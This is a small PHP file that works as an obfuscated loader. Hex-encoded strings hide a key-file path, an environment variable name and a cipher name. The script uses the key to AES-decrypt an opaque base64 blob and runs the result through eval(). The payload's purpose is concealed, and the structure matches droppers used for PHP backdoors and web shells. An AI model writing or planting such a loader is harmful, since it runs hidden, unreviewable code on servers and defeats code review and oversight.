<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('kJ5nl4RHB5NrLgYJnwN9OA==');

$c=base64_decode(

'Q+ptaROyHtFE40yLllFjFNBAYTqqJC1lcBWTuUc1lEkOHju5caE2wb46KPqamjVRpbf5s976W9aj' .
'cSUJd6BnxGEEnE23MH0jXzdtYPspB9RPMM8HCdCjRcdjEIflOmb43Sy34aVMKbusr40EPEYSIuT+' .
'4KZzfMtbcnf1HFISnl+vUbpNJhxnW8tDUVUEtjaL8oSYEwTgYkJT2Hgl1dm3M3huOdM7agZh6+wr' .
'EYJ1g3Cvl3HQf1xjJBBmglaLCPCG4W8hkMMBRCZfpuv7CGDfzArEh5PgbhszUDAs4vfprE8OmynV' .
'lcW+uz0ND9avofPqOEcAKCaGO9Y8XgTUyqDr/ZvZ3kHZExXXwfSls+1/i6MbUzSCTQdaSu6ExWNt' .
'RYzsdFc5GaVakIYuCESlfVQRYCpJAseUS/5JmS70sC2eAnoCGAiKc4Ci2XBKWOOFT1WzUQFjysB5' .
'c3VOy6NDjdc7RyFsMMr+vXEFTugeIt7AbjCqXf62fNIN5B3esyPNM/Xn/vYmLkkPhGWdHjgEknH+' .
'EtsMTo1Z+3TBSwl4RxAJ+lq5GcdornL0DbcQR9ogYiYHRbaRu/qbhqFY3O0OVd0oCuFXV93JDjbz' .
'jBpfIWzvtt8rs4TVLAQssT/getOOIxKzyZ+gFOYc3/XtB334Rb9KzjQa0XjFnUEEkrQPTsKbzcMN' .
'LKDwzopmr7czznE9Hnj1YVLMcOSJqAYRXtkVk6Quk6uObwrWtcwgOdun8e9ijOyBRDlA+3Thwgns' .
'0AY7zfYVqoI6wPvmKYY/ZKGNNBkJjhQSGntzKJ4CN4yYyV418vNaIFfwH3mZENAg94oCH15/xPXo' .
'tFqEpc5y7Zhs3MiiJPhVerKA+taRHfwqX97dFx7N2chMIhY6bnEfA7IBYZ7/44hl48GSh15mQ6Fk' .
'8GEmldUeWEJwn+bJCS4h5fVKY0ICZkpB3r2zCdojb9ZBV+ZRDL+zduqkvokkAgmwBfVs4Z5T27/H' .
'FirF1BXrxiorzkxXpJj2N391PS88rJ7j1faOzoIJeKReVAMXtkTnE43RUCmii1iwl/yIJgcjyQS/' .
'mvDZwMPLsYIteCSlMLsXQmxLNEw3HVbB1GGuGmMNPFuuN8d2trIcTsXHD+fFvZSIBWjtK1r518MI' .
'Y7MhtDCFWvcRx1bTqsvYnYePU05M+sQeZg/w3rgQWL3c0oVBNgthRuv3cLhbuAOPBntdsXe1rVbt' .
'llCOekANQpYl3ePyy5mCUtW/tzO9QaQyzJZ7aa2vEN3EcQ/TMUCLmmUfi+BYG9oZLd4rclYm3Xc1' .
'/LgLSXHwmtTtiU7Sw7nD1TEO3pR1+4dI8ClMV7C/YHSkOOF7BqagKr+OicxYWGMN5inMYqAUog=='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

